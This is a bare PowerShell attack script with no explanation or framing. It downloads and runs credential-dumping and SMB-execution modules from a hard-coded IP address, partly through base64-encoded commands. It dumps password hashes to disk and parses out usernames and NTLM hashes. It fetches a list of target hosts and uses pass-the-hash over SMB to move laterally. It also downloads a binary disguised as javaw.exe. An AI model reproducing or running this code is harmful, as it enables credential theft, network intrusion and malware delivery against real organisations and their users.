
Invoke-Expression (New-Object System.Net.WebClient).DownloadString('http://87.96.21.84/Invoke-PowerDump.ps1')
Invoke-Expression (New-Object System.Net.WebClient).DownloadString('http://87.96.21.84/Invoke-SMBExec.ps1')

$hostsContent = Invoke-WebRequest -Uri "http://87.96.21.84/extracted_hosts.txt" | Select-Object -ExpandProperty Content -ErrorAction Stop

$EncodedCommand = "KE5ldy1PYmplY3QgU3lzdGVtLk5ldC5XZWJDbGllbnQpLkRvd25sb2FkU3RyaW5nKCdodHRwOi8vODcuOTYuMjEuODQvSW52b2tlLVBvd2VyRHVtcC5wczEnKSB8IEludm9rZS1FeHByZXNzaW9uDQoNCg=="
Invoke-Expression -Command ([System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($EncodedCommand)))


$EncodedExec = "SW52b2tlLVBvd2VyRHVtcCB8IE91dC1GaWxlIC1GaWxlUGF0aCAiQzpcUHJvZ3JhbURhdGFcaGFzaGVzLnR4dCI="
Invoke-Expression -Command ([System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($EncodedExec)))


$usernames = @()
$passwordHashes = @()
$hashesContent = Get-Content -Path "C:\ProgramData\hashes.txt" -ErrorAction SilentlyContinue

if ($hashesContent) {
    foreach ($line in $hashesContent) {
        $pattern =  "^(.*?):\d+:(.*?):(.*?):.*?:"

        if ($line -match $pattern) {
            $username = $matches[1].Trim()
            $passwordHash = $matches[3].Trim()
            $usernames += $username
            $passwordHashes += $passwordHash
        }
    }
}

if ($usernames.Count -gt 0 -and $passwordHashes.Count -gt 0) {
    if ($hostsContent) {
        foreach ($targetHost in $hostsContent -split "`n") {
            if (![string]::IsNullOrWhiteSpace($targetHost)) {
                $username = $usernames[0]
                $password = $passwordHashes[0]
                Invoke-SMBExec -Target $targetHost -Username $username -Hash $password
            }
        }
    } 
}
    
Function Download-FileFromURL {
    param (
        [string]$url,
        [string]$destinationPath
    )

    try {
        $webClient = New-Object System.Net.WebClient
        $webClient.DownloadFile($url, $destinationPath)
        Write-Host "File downloaded from $url to $destinationPath"
        return $true
    } catch {
        Write-Host "Error downloading file from $url"
        return $false
    }
}

$blueUri = "http://87.96.21.84/javaw.exe"
$downloadDestination = "C:\ProgramData\javaw.exe"

$downloadSuccess = Download-FileFromURL -url $blueUri -destinationPath $downloadDestination

if ($downloadSuccess) {
    # Start-Process -FilePath $downloadDestination -ArgumentList "/silent" -NoNewWindow -Wait
}


